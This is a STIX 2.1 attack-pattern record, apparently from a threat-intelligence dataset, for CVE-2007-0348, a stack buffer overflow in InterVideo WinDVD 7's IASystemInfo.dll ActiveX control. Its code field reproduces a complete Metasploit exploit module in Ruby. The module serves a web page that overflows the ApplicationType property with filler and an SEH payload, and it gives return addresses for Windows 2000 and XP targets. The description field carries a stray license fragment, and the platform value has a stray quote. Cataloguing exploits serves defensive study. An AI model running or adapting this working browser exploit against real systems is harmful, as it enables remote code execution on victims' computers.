{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--c2f3a254-0444-450e-81d8-b86d50bae33d",
    "created": "2024-08-14T16:43:17.993364Z",
    "modified": "2024-08-14T16:43:17.993368Z",
    "name": "WinDVD7 IASystemInfo.DLL ActiveX Control Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in IASystemInfo.dll ActiveX control in InterVideo WinDVD 7. By sending an overly long string to the \"ApplicationType()\" property, an attacker may be able to execute arbitrary code.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/windvd7_applicationtype.rb",
            "external_id": "windvd7_applicationtype.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2007-0348"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n  include Msf::Exploit::Remote::Seh\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'WinDVD7 IASystemInfo.DLL ActiveX Control Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in IASystemInfo.dll ActiveX\n        control in InterVideo WinDVD 7. By sending an overly long string\n        to the \"ApplicationType()\" property, an attacker may be able to\n        execute arbitrary code.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         => [ 'MC' ],\n      'References'     =>\n        [\n          [ 'CVE', '2007-0348' ],\n          [ 'OSVDB', '34315' ],\n          [ 'BID', '23071' ],\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n        },\n      'Payload'        =>\n        {\n          'Space'         => 800,\n          'BadChars'      => \"\\x00\\x09\\x0a\\x0d'\\\\\",\n          'StackAdjustment' => -3500,\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Windows 2000 Pro English ALL',   { 'Ret' => 0x75022ac4 } ],\n          [ 'Windows XP Pro SP0/SP1 English', { 'Ret' => 0x71aa32ad } ],\n\n        ],\n      'DisclosureDate' => '2007-03-20',\n      'DefaultTarget'  => 0))\n  end\n\n  def on_request_uri(cli, request)\n    # Re-generate the payload\n    return if ((p = regenerate_payload(cli)) == nil)\n\n    # Randomize some things\n    vname\t= rand_text_alpha(rand(100) + 1)\n    strname\t= rand_text_alpha(rand(100) + 1)\n\n    # Build the exploit buffer\n    filler = rand_text_alpha(548)\n    seh = generate_seh_payload(target.ret)\n    sploit = filler + seh\n\n    # Build out the message\n    content = %Q|<html>\n      <object classid='clsid:B727C217-2022-11D4-B2C6-0050DA1BD906' id='#{vname}'></object>\n      <script language='javascript'>\n      #{strname}= new String('#{sploit}')\n      #{vname}.ApplicationType = #{strname}\n      </script>\n      </html>\n      |\n\n    print_status(\"Sending #{self.name}\")\n\n    # Transmit the response to the client\n    send_response_html(cli, content)\n\n    # Handle the payload\n    handler(cli)\n  end\nend\n",
    "x_mitre_disclosure_date": "2007-03-20",
    "x_mitre_platforms": [
        "win'"
    ]
}